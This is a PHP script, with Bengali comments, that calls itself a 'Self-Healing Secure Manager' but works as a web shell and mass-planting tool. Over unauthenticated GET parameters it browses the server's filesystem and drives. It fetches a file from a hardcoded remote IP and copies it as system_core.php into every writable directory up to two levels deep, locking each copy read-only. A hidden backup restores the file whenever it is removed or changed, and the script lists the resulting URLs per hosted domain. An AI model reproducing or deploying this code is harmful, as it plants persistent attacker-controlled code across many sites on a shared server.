<?php
/**
 * System Core Manager - Ultimate Secure & Self-Healing Version
 * Features: Auto Import, Instant Propagate, Read-Only (0444), Self-Healing Restore
 */

// ১. পাথ এবং কনফিগারেশন সেটআপ
$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);

// আপনার পাইথন সার্ভার ইউআরএল
$pythonServerUrl = "http://193.111.248.121:8000/get_file";
$targetFileName = 'system_core.php';
$masterBackup = $path . DIRECTORY_SEPARATOR . '.master_core_backup'; // লুকানো ব্যাকআপ ফাইল

echo "<html><head><title>Self-Healing Secure Manager</title>
<style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #ffffff; color: #333; padding: 20px; }
    .container { max-width: 1100px; margin: 0 auto; }
    .card { border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin-bottom: 20px; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
    .btn { padding: 10px 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; font-weight: 600; font-size: 14px; display: inline-block; transition: 0.2s; }
    .btn-auto { background: #6f42c1; color: white; } 
    .btn-blue { background: #007bff; color: white; }
    .btn-red { background: #dc3545; color: white; }
    .btn-dark { background: #343a40; color: white; }
    .btn-green { background: #28a745; color: white; }
    .alert { padding: 12px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; border: 1px solid transparent; }
    .success { background: #d4edda; color: #155724; border-color: #c3e6cb; }
    .error { background: #f8d7da; color: #721c24; border-color: #f5c6cb; }
    textarea { width: 100%; height: 160px; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-family: monospace; background: #fdfdfd; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 12px; border-bottom: 1px solid #eee; text-align: left; }
</style>
</head><body><div class='container'>";

// --- ২. সেলফ-হিলিং লজিক (অটো রিস্টোর) ---
if (file_exists($masterBackup)) {
    $mainFile = $path . DIRECTORY_SEPARATOR . $targetFileName;
    // ফাইল না থাকলে বা কন্টেন্ট পরিবর্তন হলে রিস্টোর করবে
    if (!file_exists($mainFile) || md5_file($mainFile) !== md5_file($masterBackup)) {
        if (is_writable($path)) {
            @chmod($mainFile, 0644);
            copy($masterBackup, $mainFile);
            @chmod($mainFile, 0444); // পুনরায় লক
            echo "<div class='alert success'>⚙ SELF-HEALING: $targetFileName has been restored from backup!</div>";
        }
    }
}

// --- ৩. অটো ইম্পোর্ট এবং সিকিউর প্রোপাগেশন ---
if (isset($_GET['action']) && $_GET['action'] == 'auto_process') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $pythonServerUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    $fileData = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode == 200 && $fileData !== false) {
        $savePath = $path . DIRECTORY_SEPARATOR . $targetFileName;
        
        // মাস্টার ব্যাকআপ তৈরি
        file_put_contents($savePath, $fileData);
        file_put_contents($masterBackup, $fileData);
        @chmod($savePath, 0444); 
        
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $it->setMaxDepth(2); 

        $count = 0;
        $failed = 0;
        foreach ($it as $file) {
            if ($file->isDir()) {
                $dest = $file->getPathname() . DIRECTORY_SEPARATOR . $targetFileName;
                // পারমিশন চেক করে কপি করা
                if (is_writable($file->getPathname())) {
                    if (@copy($savePath, $dest)) { 
                        @chmod($dest, 0444);
                        $count++; 
                    }
                } else {
                    $failed++;
                }
            }
        }
        echo "<div class='alert success'>✔ SUCCESS: Imported & Propagated to $count folders. (Failed: $failed due to permissions)</div>";
    } else {
        echo "<div class='alert error'>✖ FAILED: Python server unreachable (HTTP $httpCode).</div>";
    }
}

// --- ৪. কন্ট্রোল প্যানেল ---
echo "<div class='card'><div style='display: flex; gap: 15px; align-items: center; flex-wrap: wrap;'>";
    echo "<a href='?path=" . urlencode($path) . "&action=auto_process' class='btn btn-auto'>⚡ Auto Import & Secure All</a>";
    $parent = dirname($path);
    if ($path !== $parent) echo "<a href='?path=" . urlencode($parent) . "' class='btn btn-dark'>⬆ Up</a>";
    echo "<a href='?mode=drives' class='btn btn-dark' style='margin-left:auto;'>📂 Drives</a>";
echo "</div></div>";

echo "<div class='address-bar'><strong>Location:</strong> $path</div>";

// --- ৫. ইউআরএল জেনারেটর ---
$currentUrls = [];
$items = scandir($path);
natcasesort($items);
foreach ($items as $item) {
    if ($item != "." && $item != ".." && is_dir($path . DIRECTORY_SEPARATOR . $item)) {
        $currentUrls[] = "https://" . $item . "/$targetFileName";
    }
}

if (!empty($currentUrls)) {
    echo "<div class='card'><strong>Generated URL List:</strong><br><br>";
    echo "<textarea id='urlBox' readonly>" . implode("\n", $currentUrls) . "</textarea>";
    echo "<button class='btn btn-green' style='margin-top:10px;' onclick='copyToClip()'>📋 Copy List</button></div>";
}

// --- ৬. ফাইল লিস্ট টেবিল ---
echo "<div class='card' style='padding:0;'><table><tr><th>Name</th><th>Type</th></tr>";
if (isset($_GET['mode']) && $_GET['mode'] == 'drives') {
    foreach (range('A', 'Z') as $drive) {
        $dPath = $drive . ":\\";
        if (is_dir($dPath)) echo "<tr><td>📁 <a href='?path=" . urlencode($dPath) . "'>Drive $drive:</a></td><td>System Drive</td></tr>";
    }
} else {
    foreach ($items as $item) {
        if ($item == "." || $item == ".." || $item == ".master_core_backup") continue;
        $isDir = is_dir($path . DIRECTORY_SEPARATOR . $item);
        $style = ($item == $targetFileName) ? "style='color: #dc3545; font-weight: bold;'" : "";
        echo "<tr $style><td>" . ($isDir ? "📁 <a href='?path=" . urlencode($path.DIRECTORY_SEPARATOR.$item)."'>$item</a>" : "📄 $item") . "</td><td>" . ($isDir ? "Directory" : "File") . "</td></tr>";
    }
}
echo "</table></div>";

echo "<script>function copyToClip(){var b=document.getElementById('urlBox');b.select();document.execCommand('copy');alert('Copied!');}</script></div></body></html>";
